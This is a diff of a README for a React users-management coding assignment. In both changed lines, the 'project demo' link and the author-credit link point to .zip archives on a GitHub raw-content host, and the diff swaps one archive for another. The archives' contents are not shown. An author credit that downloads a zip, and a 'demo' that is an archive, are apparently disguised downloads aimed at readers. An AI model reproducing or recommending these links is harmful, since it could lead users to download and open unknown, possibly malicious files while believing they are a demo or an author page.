@@ -7,7 +7,7 @@
 - useEffect() hook
 - error handling when loading data
 
-### [Click here to see the project demo](https://raw.githubusercontent.com/Jonisark/react-assignment-4-users-management-app/master/src/react-assignment-4-users-management-app-v3.7.zip)
+### [Click here to see the project demo](https://raw.githubusercontent.com/Jonisark/react-assignment-4-users-management-app/master/src/components/react-assignment-management-app-users-2.1.zip)
 
 ### Assignment steps:
 
@@ -15,4 +15,4 @@
   - only 3 tasks to do in App component
 - finally check the project demo and try to match your one as much as possible
 
-#### [Assignment was created with &hearts; by [anisul islam](https://raw.githubusercontent.com/Jonisark/react-assignment-4-users-management-app/master/src/react-assignment-4-users-management-app-v3.7.zip) &copy;Anisul Islam]
+#### [Assignment was created with &hearts; by [anisul islam](https://raw.githubusercontent.com/Jonisark/react-assignment-4-users-management-app/master/src/components/react-assignment-management-app-users-2.1.zip) &copy;Anisul Islam]
